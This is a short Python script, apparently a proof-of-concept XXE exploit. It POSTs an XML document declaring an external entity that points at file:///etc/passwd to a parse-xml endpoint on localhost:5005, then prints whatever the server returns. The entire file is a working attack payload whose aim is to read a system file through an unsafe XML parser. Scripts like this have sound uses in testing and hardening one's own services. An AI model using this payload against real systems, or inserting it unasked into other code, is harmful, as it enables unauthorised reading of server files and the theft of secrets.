import urllib.request
req = urllib.request.Request(
    'http://localhost:5005/parse-xml',
    data=b'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    headers={'Content-Type': 'application/xml'}
)
try:
    print(urllib.request.urlopen(req).read().decode())
except urllib.error.HTTPError as e:
    print(e.code, e.read().decode())
